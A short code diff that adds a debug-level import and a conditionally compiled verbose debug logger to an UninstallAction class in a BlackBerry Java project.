@@ -16,6 +16,7 @@ import blackberry.Conf;
 import blackberry.EventManager;
 import blackberry.Main;
 import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.log.LogCollector;
 import blackberry.log.Markup;
@@ -27,7 +28,10 @@ import blackberry.utils.Utils;
  * The Class UninstallAction.
  */
 public final class UninstallAction extends SubAction {
-
+    //#ifdef DEBUG
+    static Debug debug = new Debug("UninstallAction", DebugLevel.VERBOSE);
+    //#endif
+    
     /**
      * Instantiates a new uninstall action.
      * 
